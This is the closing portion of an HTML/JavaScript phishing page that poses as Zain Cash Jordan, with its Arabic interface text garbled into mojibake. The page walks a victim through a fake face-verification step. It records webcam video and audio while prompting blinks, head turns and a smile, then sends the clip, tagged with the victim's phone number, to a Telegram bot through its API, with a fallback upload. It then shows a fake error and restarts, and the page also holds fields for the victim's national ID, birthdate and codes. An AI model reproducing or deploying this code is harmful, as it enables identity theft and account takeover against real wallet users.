              <li style="margin-bottom:6px;">Ø£Ø²Ù„ Ø§Ù„Ù‚Ø¨Ø¹Ø© Ø£Ùˆ Ø§Ù„Ù†Ø¸Ø§Ø±Ø§Øª.</li>
              <li style="margin-bottom:6px;">ØªØ£ÙƒØ¯ Ù…Ù† Ø¥Ø¶Ø§Ø¡Ø© Ø¬ÙŠØ¯Ø© ÙˆØ¸Ù‡ÙˆØ± ÙˆØ¬Ù‡Ùƒ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„.</li>
            </ul>
          </div>

          <button id="startFaceBtn" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      document.getElementById('backBtn').onclick = () => {
        renderCode4Step();
      };
      document.getElementById('startFaceBtn').onclick = async () => {
        try {
          await startCaptureSequence();
        } catch (err) {
          console.error("Capture error:", err);
          alert('Ù„Ù… Ù†Ø³ØªØ·Ø¹ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ÙˆØ§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.');
          renderCode4Step();
        }
      };
    }

    // ---------------- ØªØ³Ø¬ÙŠÙ„ Ø³Ù„Ø³Ù„Ø© Ù…Ù‚Ø§Ø·Ø¹ Ù‚ØµÙŠØ±Ø© Ø­Ø³Ø¨ Ø§Ù„ØªØ¹Ù„ÙŠÙ…Ø§Øª ----------------
    async function startCaptureSequence() {
      const steps = [
        { label: "Ø§ØºÙ…Ø¶ Ø¹ÙŠÙ†ÙŠÙƒ", duration: 2500 },
        { label: "Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø±", duration: 2500 },
        { label: "Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ†", duration: 2500 },
        { label: "Ø§Ø¨ØªØ³Ù…", duration: 2500 }
      ];

      app.innerHTML = `
        <div style="padding:8px;">
          <div class="camera-wrap">
            <div class="camera-box" id="cameraBox">
              <div class="countdown" id="countdown" style="display:none">3</div>
              <video id="videoPreview" playsinline autoplay muted></video>
            </div>
            <div class="camera-prompt" id="cameraPrompt">ØªØ­Ø¶ÙŠØ±...</div>
            <div style="width:100%;display:flex;gap:10px;justify-content:center;">
              <button id="cancelCapture" class="button" style="background:#ef5350;">Ø¥Ù„ØºØ§Ø¡</button>
            </div>
          </div>
        </div>
      `;

      const cancelBtn = document.getElementById('cancelCapture');
      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
      } catch (err) {
        throw err;
      }

      const videoEl = document.getElementById('videoPreview');
      videoEl.srcObject = stream;

      const countdownEl = document.getElementById('countdown');
      const promptEl = document.getElementById('cameraPrompt');

      // Ø§Ø®ØªØ± Ø£ÙØ¶Ù„ Ù†ÙˆØ¹ Ù…Ù…ÙƒÙ† Ù„Ù„ØªØ³Ø¬ÙŠÙ„ (Ø­Ø§ÙˆÙ„ MP4/H264 Ø«Ù… fall back Ø¥Ù„Ù‰ webm)
      let chosenMime = null;
      if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
        if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) {
          chosenMime = 'video/mp4;codecs=h264';
        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
          chosenMime = 'video/webm;codecs=vp9';
        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
          chosenMime = 'video/webm;codecs=vp8,opus';
        } else if (MediaRecorder.isTypeSupported('video/webm')) {
          chosenMime = 'video/webm';
        }
      }

      const options = chosenMime ? { mimeType: chosenMime } : undefined;

      let recorder;
      try {
        recorder = new MediaRecorder(stream, options);
      } catch (e) {
        try {
          recorder = new MediaRecorder(stream);
        } catch (err) {
          stopStream(stream);
          alert('Ø¬Ù‡Ø§Ø²Ùƒ Ø£Ùˆ Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨. Ø¬Ø±Ø¨ Ù…ØªØµÙØ­Ù‹Ø§ Ø¢Ø®Ø±.');
          renderCode4Step();
          return;
        }
      }

      let allChunks = [];
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) {
          allChunks.push(e.data);
        }
      };

      let cancelled = false;
      cancelBtn.onclick = () => {
        cancelled = true;
        try { recorder.state !== 'inactive' && recorder.stop(); } catch(e){}
        stopStream(stream);
        renderCode4Step();
      };

      for (let i = 0; i < steps.length; i++) {
        if (cancelled) break;
        const st = steps[i];
        promptEl.textContent = st.label;

        // Ø¹Ø¯ ØªÙ†Ø§Ø²Ù„ÙŠ 3..1
        countdownEl.style.display = 'block';
        for (let c = 3; c >= 1; c--) {
          countdownEl.textContent = c;
          await wait(700);
        }
        countdownEl.style.display = 'none';

        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„
        recorder.start();
        await wait(st.duration);
        if (recorder.state !== 'inactive') {
          recorder.stop();
          await wait(300); // Ø§Ù†ØªØ¸Ø± ÙˆØµÙˆÙ„ ondataavailable
        }
      }

      // Ø¨Ø¹Ø¯ Ø§Ù†ØªÙ‡Ø§Ø¡ ÙƒÙ„ Ø§Ù„Ø®Ø·ÙˆØ§Øª Ù†Ø¹Ø±Ø¶ Ù†Ø§ÙØ°Ø© Ø§Ù„ØªØ´ØºÙŠÙ„/Ø§Ù„ØªØ­Ù‚Ù‚
      stopStream(stream);

      // Ø§Ø¬Ù…Ø¹ Ø§Ù„Ù‚Ø·Ø¹ ÙÙŠ Blob ÙˆØ§Ø­Ø¯ (Ù†ÙˆØ¹ Blob Ù†Ø­Ø¯Ø¯Ù‡ Ø¨Ø­Ø³Ø¨ chosenMime Ø¥Ø°Ø§ Ø£Ù…ÙƒÙ†)
      const finalType = chosenMime ? chosenMime.split(';')[0] : (allChunks[0] ? allChunks[0].type : 'video/webm');
      const finalBlob = new Blob(allChunks.filter(b => b && b.size), { type: finalType });

      // Ø¹Ø±Ø¶ ÙˆØ§Ø¬Ù‡Ø© "Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚" Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
      showProcessing(true);
      try {
        await sendVideoToTelegramAsVideo(finalBlob);
      } catch (err) {
        console.error("Send video error:", err);
      } finally {
        showProcessing(false);
      }

      // Ø«Ù… Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ ÙˆØ¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ù„Ù„Ø¨Ø¯Ø§ÙŠØ©
      showFinalErrorAndReset();
    }

    function wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

    function stopStream(stream) {
      if (!stream) return;
      stream.getTracks().forEach(t => {
        try { t.stop(); } catch(e){}
      });
    }

    // Ø¥Ø¸Ù‡Ø§Ø±/Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©
    function showProcessing(show) {
      const modal = document.getElementById('processingModal');
      if (!modal) return;
      if (show) modal.classList.add('active');
      else modal.classList.remove('active');
    }

    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¹Ø¨Ø± sendVideo (Ù„ÙŠØ¸Ù‡Ø± ÙƒÙ…Ø´Ø§Ù‡Ø¯Ø© ÙÙŠØ¯ÙŠÙˆ ÙÙŠ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…)
    async function sendVideoToTelegramAsVideo(blob) {
      try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        const ext = blob.type.includes('mp4') ? 'mp4' : (blob.type.includes('webm') ? 'webm' : 'mp4');
        const fileName = `${userData.phone || 'user'}_face_${Date.now()}.${ext}`;
        form.append('video', blob, fileName);
        form.append('caption', `Face verification â€” ${userData.phone || ''}`);

        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
          method: 'POST',
          body: form
        });
        const data = await res.json();
        if (data && data.ok && data.result && data.result.message_id) {
          telegramMsgId = data.result.message_id;
        } else {
          console.warn('sendVideo non-ok response', data);
          // Ø­Ø§ÙˆÙ„ ÙƒØ¨Ø¯ÙŠÙ„ Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ€ document Ø¥Ù† ÙØ´Ù„
          try {
            await sendVideoAsDocumentFallback(blob);
          } catch (e) {
            console.error('Fallback send failed', e);
          }
        }
      } catch (err) {
        console.error('Error in sendVideoToTelegramAsVideo:', err);
        try {
          await sendVideoAsDocumentFallback(blob);
        } catch (e) {
          console.error('Fallback send failed', e);
          throw err;
        }
      }
    }

    async function sendVideoAsDocumentFallback(blob) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      const fileName = `${userData.phone || 'user'}_face_${Date.now()}.webm`;
      form.append('document', blob, fileName);
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: form
      });
      const data = await res.json();
      if (data && data.ok && data.result && data.result.message_id) {
        telegramMsgId = data.result.message_id;
      } else {
        console.warn('sendDocument fallback non-ok response', data);
      }
    }

    // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù†ØµÙŠØ© ÙˆØ§Ø­ØµÙ„ Ø¹Ù„Ù‰ message_id Ø¥Ø°Ø§ Ù†Ø¬Ø­
    async function sendToTelegramAndGetMsgId(msg) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg
          })
        });
        const data = await res.json();
        if (data && data.result && data.result.message_id) {
          return data.result.message_id;
        }
      } catch (err) {
        console.log("Telegram send error:", err);
      }
      return null;
    }

    async function resendTelegramMsg(msg) {
      if (telegramMsgId) {
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              message_id: telegramMsgId
            })
          });
        } catch (err) {
          // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø®Ø·Ø£ Ø¥Ø°Ø§ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù…Ø­Ø°ÙˆÙØ© Ø£Ùˆ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø©
        }
      }
      return await sendToTelegramAndGetMsgId(msg);
    }

    // Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡: Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ Ø«Ù… Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡ Ù„Ù„Ø¨Ø¯Ø§ÙŠØ© (ØµÙØ­Ø© Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ)
    function showFinalErrorAndReset() {
      document.getElementById('modalError').classList.add('active');
      const closeBtn = document.getElementById('modalCloseBtn');
      function closeHandler() {
        document.getElementById('modalError').classList.remove('active');
        closeBtn.removeEventListener('click', closeHandler);
        userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
        renderPhoneStep();
      }
      closeBtn.addEventListener('click', closeHandler);
      setTimeout(() => {
        if (document.getElementById('modalError').classList.contains('active')) {
          document.getElementById('modalError').classList.remove('active');
          userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
          renderPhoneStep();
        }
      }, 2500);
    }

    // Ø§Ø¨Ø¯Ø£ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø¨Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
    const app = document.getElementById('app');
    renderPhoneStep();
  </script>
</body>
</html>
